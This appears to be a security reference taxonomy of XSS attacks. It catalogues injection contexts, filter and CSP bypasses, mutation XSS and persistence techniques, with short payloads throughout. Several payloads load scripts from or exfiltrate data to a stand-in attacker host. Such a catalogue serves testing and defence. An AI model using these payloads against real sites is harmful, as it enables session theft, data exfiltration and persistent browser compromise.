# Cross-Site Scripting (XSS) Mutation/Variation Taxonomy

---

## Classification Structure

This taxonomy organizes the full attack surface of Cross-Site Scripting (XSS) across three orthogonal axes:

**Axis 1 — Injection Context (Primary Axis):** The structural location within the document where attacker-controlled input is rendered or interpreted. This determines which parsing rules apply and which payload forms are viable. The injection context is the single most important factor governing what an attacker can and cannot do — identical payloads succeed or fail depending entirely on where they land.

**Axis 2 — Defense Bypass Mechanism (Cross-Cutting Axis):** The technique used to evade security controls that stand between input and execution. Modern XSS rarely succeeds through direct injection alone; instead, it exploits discrepancies between how defenses parse/validate input and how browsers interpret it. Each bypass type can apply across multiple injection contexts.

**Axis 3 — Exploitation Scenario (Impact Axis):** The post-exploitation action taken once JavaScript execution is achieved. This maps techniques to real-world consequences — from session hijacking to persistent browser-level compromise via service workers.

### Axis 2 Summary: Defense Bypass Types

| Bypass Type | Mechanism | Applicable Across |
|---|---|---|
| **Encoding Differential** | Input is decoded differently by filter vs. browser (URL-encoding, HTML entities, Unicode, double-encoding) | All contexts |
| **Parser Differential** | Sanitizer and browser disagree on DOM structure (mutation XSS, namespace confusion, node flattening) | §1, §2, §7 |
| **WAF Evasion** | Payload structure avoids signature/regex detection (parameter pollution, case variation, comment insertion, null bytes) | All contexts |
| **CSP Bypass** | Execution achieved despite Content Security Policy (JSONP endpoints, base-uri injection, nonce leakage, unsafe directives) | §1, §3, §4 |
| **Sanitizer Bypass** | Input survives HTML sanitization libraries (DOMPurify, Bleach) via mutation, prototype pollution, or regex flaws | §1, §2, §7 |
| **Framework Bypass** | Exploiting framework-specific rendering (React dangerouslySetInnerHTML, Angular template injection, Vue v-html) | §3, §9 |
| **Protocol-Level** | Cookie parsing differentials, CRLF injection, content-type sniffing to achieve script execution | §4, §10 |

### Foundational Concept: The Browser Parsing Pipeline

XSS fundamentally exploits the browser's multi-stage parsing pipeline. User input passes through:

1. **Network layer** → HTTP headers, Content-Type negotiation, MIME sniffing
2. **HTML parser** → Tokenization, tree construction, error recovery, foreign content (SVG/MathML)
3. **Attribute parser** → Entity decoding, URL resolution, event handler compilation
4. **JavaScript engine** → Eval, Function constructor, template literals, dynamic import
5. **CSS parser** → url() resolution, expression() (legacy), @import
6. **DOM APIs** → innerHTML, document.write, postMessage handlers, Trusted Types sinks

Every transition between stages creates a potential discrepancy that attackers exploit. The taxonomy below is organized by where in this pipeline the injection occurs.

---

## §1. HTML Element Context

Injection into the content area between HTML tags, where the attacker can introduce new elements. This is the most classic and well-understood XSS context.

### §1-1. Direct Script Tag Injection

The most straightforward vector: injecting a `<script>` element that the browser executes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Inline script block** | `<script>alert(1)</script>` inserted into page body | No tag filtering; CSP allows `unsafe-inline` or no CSP |
| **External script load** | `<script src="https://evil.com/x.js"></script>` loads remote payload | CSP allows the attacker's domain or uses wildcard `*` |
| **Module import** | `<script type="module">import('https://evil.com/x.js')</script>` | CSP does not restrict module imports; dynamic `import()` bypasses some CSP |
| **Nonce-reuse injection** | Script tag injected with a guessed or leaked CSP nonce | Nonce is static, predictable, or leaked via CSS attribute selectors |
| **Script via XSLT** | `<xsl:script>` or `<msxsl:script>` in XML-processed contexts | Application processes user input as XML/XSLT |

### §1-2. Event Handler Element Injection

Injecting HTML elements with inline event handlers that fire automatically or with minimal interaction.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Auto-firing events** | `<img src=x onerror=alert(1)>`, `<body onload=...>`, `<svg onload=...>` | Element rendered; `onerror` fires on intentionally broken resource |
| **Focus-based auto-fire** | `<input autofocus onfocus=alert(1)>`, `<div contenteditable autofocus onfocus=...>` | `autofocus` attribute triggers focus without user action |
| **Visibility-based events** | `<div oncontentvisibilityautostatechange=alert(1) style="content-visibility:auto">` | Browser supports `content-visibility` CSS property (2025 vector) |
| **Animation-triggered events** | `<div style="animation:x" onanimationstart=alert(1)>` with `@keyframes x {}` | CSS animations supported; `onanimationstart` fires automatically |
| **Exotic browser events** | `onwebkitplaybacktargetavailabilitychanged` on `<audio>`/`<video>` (Safari-specific) | Safari browser; specific media element events |
| **Interaction-dependent events** | `onclick`, `onmouseover`, `onpointerdown`, etc. | Requires user interaction (lower severity, but still exploitable) |

### §1-3. Embedded Object Injection

Injecting elements that load external content capable of script execution.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **iframe injection** | `<iframe src="javascript:alert(1)">` or `<iframe srcdoc="<script>alert(1)</script>">` | `srcdoc` bypasses some CSP; `javascript:` URI in src |
| **object/embed injection** | `<object data="data:text/html,...">`, `<embed src="javascript:...">` | Legacy elements often overlooked by filters |
| **SVG foreignObject** | `<svg><foreignObject><body onload=alert(1)>` | SVG rendering context allows embedded HTML via `foreignObject` |
| **base tag hijacking** | `<base href="https://evil.com/">` redirects all relative URLs | `base-uri` CSP directive absent; relative script paths exist on page |

---

## §2. HTML Attribute Context

Injection into the value of an existing HTML attribute, where the attacker must break out of the attribute or leverage the attribute's semantics.

### §2-1. Attribute Value Breakout

Escaping the current attribute to inject new attributes or elements.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Quote breakout** | Input `" onfocus=alert(1) autofocus="` closes the attribute and injects event handler | Attribute value not entity-encoded; matching quote character allowed |
| **Tag breakout** | Input `"><script>alert(1)</script>` closes the tag entirely | No output encoding on `<` and `>` characters |
| **Backtick breakout (IE)** | Using `` ` `` as attribute delimiter in legacy Internet Explorer | Target uses legacy IE rendering modes |
| **Unquoted attribute injection** | Input `x onfocus=alert(1)` adds new attribute when value is unquoted | Server renders attribute without quotes |

### §2-2. Event Handler Attribute Injection

Adding event-handler attributes to existing elements.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Reflected into existing tag** | User input reflected as `<div class="[INPUT]">` → inject `" onmouseover=alert(1) x="` | Input lands inside an existing tag's attribute |
| **Autofocus chaining** | Injecting `autofocus onfocus=alert(1)` into any focusable element | Element supports autofocus (most elements in modern browsers) |
| **tabindex exploitation** | Adding `tabindex=0` to make non-focusable elements focusable, enabling `onfocus` | Combined with `autofocus` for auto-triggering |

### §2-3. Special Attribute Semantics

Exploiting attributes that have inherent execution capabilities.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **href/src javascript: URI** | `<a href="javascript:alert(1)">` | Filter does not block `javascript:` protocol; user clicks link |
| **action javascript: URI** | `<form action="javascript:alert(1)"><button>Submit</button></form>` | Form `action` attribute not validated |
| **formaction override** | `<button formaction="javascript:alert(1)">` overrides form action | Button with `formaction` inside a form |
| **data: URI in src** | `<iframe src="data:text/html,<script>alert(1)</script>">` | `data:` URIs not blocked |
| **meta refresh injection** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input reflected in meta tag; browser follows javascript: in refresh |
| **SVG animate href** | `<svg><a><animate attributeName=href values=javascript:alert(1)><text>click</text>` | SVG context; animation changes href to javascript: URI |
| **poster attribute** | `<video poster=javascript:alert(1)>` (limited browser support) | Legacy browser behavior |

### §2-4. Hidden Input and Meta Tag Exploitation

Achieving XSS from seemingly unexploitable injection points.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **accesskey + onclick on hidden input** | `<input type=hidden accesskey=x onclick=alert(1)>` triggered via Alt+Shift+X | Requires user to press specific key combination (Firefox) |
| **meta tag CSP injection** | Injecting `<meta http-equiv="Content-Security-Policy" content="...">` to weaken CSP | Input reflected before existing CSP meta tag |

---

## §3. JavaScript Context

Injection into inline or external JavaScript code, where the attacker's input is embedded within script blocks or JS string literals.

### §3-1. String Literal Breakout

Breaking out of JavaScript string contexts to inject executable code.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Quote termination** | Input `'; alert(1); '` closes string and injects statement | Server embeds user input in JS string without escaping quotes |
| **Template literal injection** | Input `` ${alert(1)} `` inside backtick-delimited template literal | Server uses template literals with user data |
| **Line terminator injection** | Using `\u2028` (Line Separator) or `\u2029` (Paragraph Separator) to break string | Pre-ES2019 environments where these terminate strings |
| **Escape sequence manipulation** | Input `\'; alert(1);//` where server adds `\` before `'`, resulting in `\\'; alert(1);//` | Server's escaping creates an escaped backslash, freeing the quote |
| **Script block closure** | Input `</script><script>alert(1)</script>` — HTML parser takes priority over JS parser | `</script>` inside a string literal still closes the script tag in HTML |

### §3-2. Dynamic Code Execution Sinks

User input reaching JavaScript functions that execute strings as code.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **eval() injection** | User input passed to `eval(userInput)` | Application uses eval with unsanitized data |
| **Function constructor** | `new Function('return ' + userInput)()` | Dynamically constructed functions |
| **setTimeout/setInterval strings** | `setTimeout('doSomething("' + userInput + '")', 1000)` | String argument to timer functions |
| **document.write()** | `document.write('<div>' + userInput + '</div>')` | Direct DOM write with unsanitized input |
| **innerHTML assignment** | `element.innerHTML = userInput` | DOM manipulation without sanitization |
| **jQuery html()** | `$(selector).html(userInput)` | jQuery convenience methods bypass text-only safety |
| **Angular expression** | `{{constructor.constructor('alert(1)')()}}` (AngularJS 1.x) | AngularJS template compiles user input |
| **Vue template compilation** | `v-html` directive or server-side template mixing | User input rendered as Vue template |

### §3-3. DOM Source-to-Sink Flows

Client-side XSS where user-controlled DOM sources flow into dangerous sinks without server involvement.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **location.hash to innerHTML** | `document.getElementById('x').innerHTML = location.hash.slice(1)` | Fragment identifier used as content |
| **location.search to document.write** | URL query parameter written directly to DOM | Client-side routing or parameter handling |
| **document.referrer exploitation** | Referrer URL injected into DOM via client-side code | Application reads and renders referrer |
| **window.name cross-origin** | Attacker sets `window.name` on their page, victim reads it | Legacy cross-origin data passing via window.name |
| **document.cookie to DOM** | Cookie values rendered in DOM without encoding | Client-side cookie display/processing |
| **Web Storage to DOM** | `localStorage`/`sessionStorage` values injected by attacker script and later rendered | Stored DOM XSS via poisoned storage |
| **URL fragment directive** | Exploiting Text Fragment API (`#:~:text=`) interactions with page scripts | Scripts process fragment directives |

---

## §4. URL/URI Context

Injection into URL-processing contexts, exploiting protocol handlers, URL parsing, and URI scheme interpretation.

### §4-1. Protocol Scheme Injection

Using executable protocol schemes where URLs are expected.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **javascript: URI** | `javascript:alert(1)` in any URL-accepting attribute | Protocol scheme not filtered; user navigates to link |
| **javascript: with encoding** | `java%0ascript:alert(1)`, `&#106;avascript:`, `\u006Aavascript:` | Filter checks literal string but browser decodes entities/escapes |
| **data: URI with HTML** | `data:text/html,<script>alert(1)</script>` | `data:` scheme allowed in context |
| **data: URI base64** | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Base64 encoding evades pattern-matching filters |
| **vbscript: (legacy IE)** | `vbscript:MsgBox("XSS")` | Internet Explorer; legacy protocol handler |
| **blob: URI** | Constructing Blob URLs with HTML content containing scripts | Application creates and navigates to blob URLs |

### §4-2. URL Parser Differentials

Exploiting differences in how filters vs. browsers parse URLs.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Backslash normalization** | `javascript:\x0aalert(1)` — browsers normalize certain whitespace within scheme | Browser-specific whitespace tolerance in URL schemes |
| **Tab/newline insertion** | `java\tscript:alert(1)` or `java\nscript:alert(1)` | Browser ignores control characters within URL scheme |
| **Null byte truncation** | `javascript:\0alert(1)` — filter sees null byte, browser ignores it | Null byte handling differential |
| **Authority confusion** | `javascript://example.com/%0aalert(1)` — appears as comment, executes after newline | Filter sees "valid URL", browser executes JS after `//` comment |
| **URL-encoded scheme** | `%6A%61%76%61%73%63%72%69%70%74:alert(1)` | Some contexts decode URL encoding before scheme check |

### §4-3. Redirect-Based XSS

Exploiting server-side or client-side redirects to deliver XSS payloads.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Open redirect to javascript:** | Redirect endpoint sends `Location: javascript:alert(1)` | Server does not validate redirect target scheme |
| **Meta refresh redirect** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input controls meta refresh URL |
| **DOM-based redirect** | `location.href = userInput` or `window.open(userInput)` | Client-side redirect with unsanitized input |
| **OAuth fragment leak** | Redirect preserves `#access_token=...` across 302, readable via `location.hash` | OAuth implicit flow combined with open redirect |

---

## §5. CSS Context

Injection into CSS parsing contexts, enabling scriptless data exfiltration or, in legacy browsers, direct JavaScript execution.

### §5-1. CSS-Based Script Execution (Legacy)

Direct JavaScript execution via CSS features in older browsers.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **expression() (IE)** | `background: expression(alert(1))` | Internet Explorer 5–8 (removed in IE9 standards mode) |
| **-moz-binding (Firefox)** | `style="-moz-binding:url(xss.xml#xss)"` | Legacy Firefox; XBL binding |
| **behavior (IE)** | `behavior:url(xss.htc)` | Internet Explorer; HTC component |

### §5-2. CSS-Based Data Exfiltration

Extracting sensitive data without JavaScript execution — effective against strict CSPs.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Attribute selector exfiltration** | `input[value^="a"]{background:url(https://evil.com/?a)}` iterated per character | CSS injection exists; target has sensitive data in attributes |
| **CSP nonce leakage** | CSS selectors targeting `script[nonce^="..."]` leak nonce characters via background requests | Nonce value present in DOM attribute; CSP allows CSS |
| **Font-based text leak** | Custom `@font-face` with `unicode-range` detects specific characters in text nodes | Advanced technique; requires controlled font loading |
| **Scroll-based exfiltration** | Using `scroll-timeline` or `animation-timeline` CSS features to detect content | 2025 emerging technique using CSS animations |

### §5-3. CSS Injection for XSS Enablement

CSS injection that enables or amplifies XSS through indirect means.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **@import external CSS** | `@import url(https://evil.com/xss.css)` loads attacker's stylesheet | CSP allows the import source |
| **Style tag injection** | `<style>` tag with `@import` or malicious selectors | Input reflected in CSS context |
| **Dangling markup via CSS** | CSS `url()` function captures subsequent HTML as part of the URL | CSS parsing consumes HTML beyond the injection point |

---

## §6. DOM Manipulation Context

Exploitation through DOM APIs and browser-native features that create or modify page structure.

### §6-1. DOM Clobbering

Overwriting JavaScript variables and API references by injecting HTML elements with specific `id` or `name` attributes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Global variable clobbering** | `<img id="x">` makes `window.x` reference the element instead of expected JS object | Application checks `if (x)` or reads `x.y` where `x` is expected to be a JS variable |
| **Nested property clobbering** | `<a id=x><a id=x name=y href="javascript:alert(1)">` creates `x.y` via DOM collection | Application accesses `x.y` as a URL or value |
| **Form element clobbering** | `<form id=x><input name=y value=evil>` makes `x.y.value` attacker-controlled | Application reads form element properties |
| **document property clobbering** | `<img name=cookie>` clobbers `document.cookie` accessor | Scripts reference `document.cookie` after clobbering |
| **Clobbering in libraries** | Webpack `import.meta.url`, Google Closure, MathJax gadgets overwritten via DOM clobbering | Clobberable property flows into a script-loading sink (497+ gadgets identified) |

### §6-2. Prototype Pollution to XSS

Polluting JavaScript object prototypes to inject values that reach XSS sinks.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Polluted innerHTML gadget** | `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'` consumed by code reading undefined property | Merge/clone operation with attacker-controlled deep keys |
| **Polluted src/href gadget** | `Object.prototype.src = 'javascript:alert(1)'` used by script/link loading code | Library reads `.src` from config without explicit assignment |
| **Polluted transport_url** | Google Analytics `transport_url` property polluted to access `script.src` sink | GA loaded with default config; prototype pollution source exists |
| **Sanitizer initialization bypass** | `Object.prototype.after` polluted before DOMPurify init (CVE-2024-45801) | Prototype pollution occurs before sanitizer loads |
| **Template engine gadgets** | Polluted properties consumed by Handlebars, Pug, or EJS template compilation | Server-side rendering with prototype pollution |

### §6-3. postMessage Exploitation

Exploiting cross-origin messaging APIs for XSS.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Missing origin validation** | Listener does `window.addEventListener('message', (e) => eval(e.data))` without checking `e.origin` | No origin check or wildcard origin |
| **Insufficient origin check** | `if (e.origin.indexOf('trusted.com') > -1)` bypassed with `trusted.com.evil.com` | Regex/substring origin validation |
| **Data to dangerous sink** | postMessage data flows to `innerHTML`, `location.href`, or `eval()` | Trusted message data treated as safe |
| **Wildcard targetOrigin** | `parent.postMessage(secret, '*')` leaks data to any embedding origin | Secrets sent with wildcard origin |

---

## §7. Markup Parser Differential Context (Mutation XSS)

Exploiting differences between how HTML sanitizers parse markup and how browsers reconstruct it. This is the most sophisticated XSS category.

### §7-1. DOM Mutation (mXSS)

Payloads that are safe when parsed by the sanitizer but become dangerous after the browser's HTML parser reconstructs the DOM.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Node flattening** | Deeply nested elements exceed browser's nesting limit; browser removes inner wrappers, exposing payload | DOMPurify ≤ 3.1.0 (2024 bypass); depth threshold varies by browser |
| **Namespace confusion** | MathML/SVG namespace causes element to be parsed differently than sanitizer expects | `<math><mtext><table><mglyph><style>` triggers foreign-content parsing rules |
| **Comment node mutation** | Sanitizer checks text nodes but ignores comments; browser converts comment content into active DOM after mutation | Comment containing encoded entity within math/SVG context |
| **Stack of open elements** | Browser's "adoption agency algorithm" restructures nesting in ways sanitizer cannot predict | Misnested formatting elements (`<b>`, `<i>`, `<a>`) cause tree reconstruction |
| **Template element escape** | Content inside `<template>` parsed in inert mode by sanitizer but activated when moved to live DOM | Sanitizer treats `<template>` content as safe |
| **Regex-based sanitizer bypass** | DOMPurify's template literal regex fails to catch edge cases (CVE-2025-26791) | `SAFE_FOR_TEMPLATES` mode with SVG edge cases |

### §7-2. Encoding-Level Mutation

Payloads that transform during character encoding or entity processing.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **UTF-7 injection** | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` interpreted as UTF-7 | Missing charset declaration; legacy browser auto-detection |
| **Double encoding** | `%253Cscript%253E` decoded twice — once by proxy/WAF, once by app | Multiple decoding layers in request processing |
| **HTML entity nesting** | `&amp;lt;` → `&lt;` → `<` after multiple parse passes | Server performs entity decoding before final output |
| **Overlong UTF-8** | Non-shortest-form UTF-8 bytes interpreted differently by filter vs. runtime | Legacy systems with lax UTF-8 validation |
| **Charset mismatch** | Server declares UTF-8 but content contains Shift_JIS sequences that consume quote characters | Character encoding mismatch between header and content |

### §7-3. Content-Type and MIME Confusion

Causing the browser to interpret content in a more dangerous MIME context.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **MIME sniffing** | Browser ignores `Content-Type: text/plain` and interprets content as HTML | `X-Content-Type-Options: nosniff` header absent |
| **Content-Type via CRLF** | CRLF injection sets `Content-Type: text/html` for a non-HTML response | Header injection vulnerability |
| **SVG as image** | SVG file served as `image/svg+xml` executes embedded `<script>` tags | SVG file upload without content validation |
| **Polyglot files** | File valid as both image and HTML; browser renders as HTML in certain contexts | Content-Type negotiation or MIME sniffing |

---

## §8. WAF/Filter Evasion Techniques

Systematic methods to bypass input validation, output encoding, and Web Application Firewalls. These techniques apply across multiple injection contexts.

### §8-1. Tag and Keyword Obfuscation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Case variation** | `<ScRiPt>`, `<SCRIPT>`, `<scRIPT>` | Case-sensitive filter matching |
| **Null byte insertion** | `<scr\x00ipt>` — filter stops at null, browser ignores it | Null byte handling differential |
| **Comment insertion** | `<scr<!--comment-->ipt>` or `<script/x>` | HTML parser error recovery; filter expects clean tags |
| **Tag name padding** | `<script\t\n\r >` with whitespace/control chars after tag name | Regex matches exact tag name without whitespace tolerance |
| **Slash substitution** | `<img/src=x/onerror=alert(1)>` — forward slash as attribute separator | HTML parser accepts `/` as whitespace equivalent in tags |
| **Rare/custom tags** | `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>` | Filter blocklist does not cover all HTML elements |
| **SVG/MathML tags** | `<svg><script>alert(1)</script></svg>` — foreign element context | Filter does not understand foreign content parsing |

### §8-2. JavaScript Payload Obfuscation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **String construction** | `window['al'+'ert'](1)` or `self[atob('YWxlcnQ=')](1)` | Filter blocks literal `alert`, `eval` keywords |
| **Template literal execution** | `` alert`1` `` — tagged template literal calls function without parentheses | Filter blocks `(` and `)` characters |
| **Arrow function** | `x=>alert(1)` or `(x=>{alert(1)})()` | Compact syntax evades pattern matching |
| **Constructor chain** | `[].constructor.constructor('alert(1)')()` | Accesses `Function` constructor without keyword |
| **Unicode escapes in JS** | `\u0061lert(1)` — JS interprets Unicode escapes in identifiers | Filter does not decode JS Unicode escapes |
| **Computed property access** | `window['alert'](1)`, `self['al'+'ert'](1)` | Bracket notation bypasses static keyword detection |
| **with statement** | `with(document)body.appendChild(createElement('script')).src='//evil.com'` | Avoids direct property references |
| **import() expression** | `import('https://evil.com/x.js')` — dynamic import in modern browsers | CSP may not block dynamic imports; avoids eval |
| **top-level await** | `await import('//evil.com/x.js')` in module context | Module context available |

### §8-3. HTTP Parameter Pollution (HPP)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Payload splitting** | XSS payload split across duplicate parameters: `?q=<script>&q=alert(1)&q=</script>` | Server concatenates duplicate params (ASP.NET joins with `,`) |
| **Parameter override** | WAF checks first param, app uses last (or vice versa) | Different parameter precedence between WAF and application |
| **Array parameter confusion** | `?q[]=<script>&q[]=alert(1)` | Framework-specific array parameter handling |

### §8-4. AI-Generated Evasion (2025 Emerging)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Adversarial payload generation** | ML models generate novel payloads that bypass ML-based WAFs | WAF uses signature or ML detection; attacker uses adversarial AI |
| **Contextual mutation** | AI adapts payload structure based on observed WAF response patterns | Automated fuzzing with feedback loop |

---

## §9. Framework and Rendering Engine Context

XSS vectors specific to client-side frameworks, template engines, and rendering pipelines.

### §9-1. Client-Side Template Injection (CSTI)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **AngularJS sandbox escape** | `{{constructor.constructor('alert(1)')()}}` (v1.x, sandbox removed in 1.6+) | AngularJS 1.x; user input in `ng-app` scope |
| **Vue v-html injection** | `v-html` directive renders raw HTML including scripts | Developer uses `v-html` with user data |
| **Vue template compilation** | Server mixes SSR templates with client-side Vue compilation | User input reaches Vue template compiler |
| **React dangerouslySetInnerHTML** | `dangerouslySetInnerHTML={{__html: userInput}}` | Developer explicitly opts into unsafe rendering |
| **React SSR hydration mismatch** | Server-rendered HTML differs from client hydration, causing unexpected DOM | SSR output contains user input not matching client expectation |
| **Svelte @html directive** | `{@html userInput}` renders raw HTML | Direct raw HTML rendering in Svelte |

### §9-2. Markdown and Rich Text Rendering

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Markdown link injection** | `[click](javascript:alert(1))` in markdown parser | Parser does not strip `javascript:` protocol (CVE-2025-24981) |
| **Markdown HTML passthrough** | `<script>alert(1)</script>` rendered verbatim in markdown | Parser allows raw HTML (common default) |
| **Markdown image injection** | `![x](data:text/html,<script>alert(1)</script>)` or `<img>` with event handler | Parser does not sanitize image source URIs |
| **HTML entity bypass in markdown** | `&#106;avascript:` in link URL bypasses denylist of `javascript:` | Filter checks literal string; parser decodes entities |
| **Rich text editor XSS** | WYSIWYG editor (TinyMCE, CKEditor, Quill) allows script injection via HTML mode | Insufficient output sanitization of editor content |

### §9-3. Server-Side Template Injection (SSTI) to XSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Jinja2/Twig XSS** | `{{ '<script>alert(1)</script>' }}` without auto-escaping | Auto-escape disabled or `|safe` filter used |
| **ERB unescaped output** | `<%== user_input %>` or `<%= raw(user_input) %>` in Rails 3+ | `<%= %>` auto-escapes by default in Rails 3+; `<%== %>` or `raw()` bypasses escaping. In Rails 2, `<%= %>` is unsafe without the `h()` helper |
| **PHP echo injection** | `<?php echo $_GET['x']; ?>` without `htmlspecialchars()` | Direct output of user input |
| **Handlebars triple-stash** | `{{{ userInput }}}` renders unescaped HTML | Triple-mustache bypasses auto-escaping |

---

## §10. Protocol and Transport-Level Context

XSS achieved through manipulation of HTTP protocol features, cookie handling, or content negotiation.

### §10-1. HTTP Response Splitting / CRLF Injection

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Header injection to body** | `\r\n\r\n<script>alert(1)</script>` injected into HTTP header terminates headers, starts body | User input reflected in HTTP response header without CRLF filtering |
| **Content-Type override** | CRLF injection adds `Content-Type: text/html` header | Response originally non-HTML; CRLF injection possible |
| **Set-Cookie injection** | Injecting `Set-Cookie` header to plant malicious cookie values | Cookie value later rendered in DOM |

### §10-2. Cookie-Based XSS Vectors

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Cookie sandwich attack** | Manipulating `$Version` cookie to switch server to RFC2109 parsing, sandwiching HttpOnly cookie values between attacker cookies | Apache Tomcat (8.5.x, 9.0.x, 10.0.x); Chrome allows `$`-prefixed cookie names from JS |
| **Phantom $Version cookie** | Setting `$Version=1` from JavaScript forces legacy cookie parsing on server | Server supports RFC2109 fallback; Chrome browser |
| **Cookie value to DOM** | Cookie value containing XSS payload rendered via client-side JS | Application reads and renders cookies in DOM |
| **__Host/__Secure prefix bypass** | Bypassing cookie prefix protections to set cookies that override authenticated sessions | Recent research demonstrates prefix bypass techniques |

### §10-3. File Upload and Content Delivery XSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **SVG file upload** | Uploaded SVG contains `<script>` or event handlers; served with `image/svg+xml` | Application allows SVG upload; serves from same origin |
| **HTML file upload** | `.html` file uploaded and accessible directly | No content-type restriction; same-origin serving |
| **PDF XSS** | PDF with embedded JavaScript served inline | `Content-Disposition: inline` for PDF; browser renders PDF JS |
| **XML file with XSS** | Uploaded XML processed with XSLT containing script | XML processing with user-controlled stylesheets |
| **Polyglot file** | File valid as both JPEG and HTML (or GIF and HTML) | MIME sniffing enabled; file served without `nosniff` |

---

## §11. Persistence and Advanced Exploitation Context

Techniques for maintaining XSS access beyond a single page load and maximizing exploitation impact.

### §11-1. Service Worker Persistence

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Malicious SW registration** | XSS registers a service worker that intercepts all requests and injects payloads | Application serves a JS file from same scope; HTTPS |
| **SW cache poisoning** | Service worker overwrites cached JS/HTML responses with malicious versions | Existing service worker uses Cache API; XSS can modify cache |
| **SW as C2 channel** | Service worker maintains persistent communication with attacker server | SW push notifications or periodic sync as command channel |
| **SW via DOM clobbering** | DOM clobbering overwrites the service worker registration URL | Service worker path loaded from a clobberable DOM property |

Service workers persist across sessions until replaced or manually cleared (average update cycle: ~40 days), making them the most powerful XSS persistence mechanism.

### §11-2. Blind XSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Admin panel injection** | Payload stored in user input field, triggers when admin views data | Admin panel renders user data without sanitization |
| **Log/monitoring injection** | XSS payload in User-Agent, Referer, or other headers logged and rendered in dashboard | Log viewer renders HTML from logged data |
| **Email/notification injection** | Payload triggers when notification is rendered in webmail or notification center | HTML rendering in notification/email context |
| **Support ticket injection** | Payload stored in ticket description, fires in agent's browser | Support platform renders HTML tickets |

Blind XSS payloads typically use `import()` or external script loading with out-of-band reporting via tools like XSS Hunter.

### §11-3. Scriptless Exploitation (Dangling Markup)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Unclosed img tag** | `<img src='https://evil.com/?` captures subsequent HTML as part of URL until next `'` | CSP blocks scripts but allows images; injection before sensitive data |
| **Unclosed form action** | `<form action='https://evil.com/?` captures form data including CSRF tokens | Form data between injection and next quote exfiltrated |
| **Unclosed textarea** | `<textarea>` captures page content until closing tag | Exfiltrates visible page content |
| **Base tag redirect** | `<base href='https://evil.com/'>` causes all relative URLs to resolve to attacker domain | No `base-uri` CSP; relative asset/form paths on page |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **Session Hijacking** | Any web app with session cookies | §1 + §3 + §10-2 — Execute JS to exfiltrate `document.cookie` or use cookie sandwich |
| **Account Takeover** | Apps with API tokens or OAuth | §3-3 + §6-3 + §4-3 — DOM XSS chains with postMessage leaks and redirect exploitation |
| **Credential Phishing** | Any authenticated application | §1-2 + §11-2 — Inject fake login form via stored/blind XSS |
| **Data Exfiltration (scripted)** | Apps with sensitive client-side data | §3-2 + §6-3 — Read DOM content, API responses, or cross-origin data |
| **Data Exfiltration (scriptless)** | CSP-protected applications | §5-2 + §11-3 — CSS selectors and dangling markup leak data without JS |
| **Persistent Compromise** | HTTPS applications | §11-1 — Service worker registration for long-term payload injection |
| **Worm Propagation** | Social platforms, messaging apps | §1 + §3-2 — Self-propagating stored XSS that replicates via social features |
| **Cache Poisoning** | CDN/proxy-fronted applications | §7-3 + §8-3 — Inject XSS into cached responses via MIME confusion or parameter pollution |
| **WAF/ACL Bypass** | Enterprise applications behind WAFs | §8 — Bypass WAF to reach underlying XSS, chain with §1–§4 for execution |
| **Keylogging / Surveillance** | Any targeted application | §1-2 + §11-1 — Event listeners capture keystrokes; service worker persists access |
| **Cryptomining** | High-traffic web applications | §1-1 + §11-1 — Inject mining script; persist via service worker |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §7-1 (Node flattening mXSS) | CVE-2024-47875 (DOMPurify < 3.1.3) | DOMPurify sanitization bypass; arbitrary JS execution in all dependent apps |
| §7-1 (Regex sanitizer bypass) | CVE-2025-26791 (DOMPurify < 3.2.4) | mXSS via incorrect template literal regex in `SAFE_FOR_TEMPLATES` mode |
| §6-2 (Prototype pollution → sanitizer) | CVE-2024-45801 (DOMPurify ≤ 3.0.8) | Prototype pollution of `Node.prototype.after` bypasses Trusted Types |
| §6-1 (DOM clobbering → script load) | CVE-2024-43788 (Webpack) | DOM clobbering in `AutoPublicPathRuntimeModule` leads to XSS |
| §6-1 (DOM clobbering → router) | CVE-2024-47885 (Astro) | DOM clobbering in client-side router enables stored XSS |
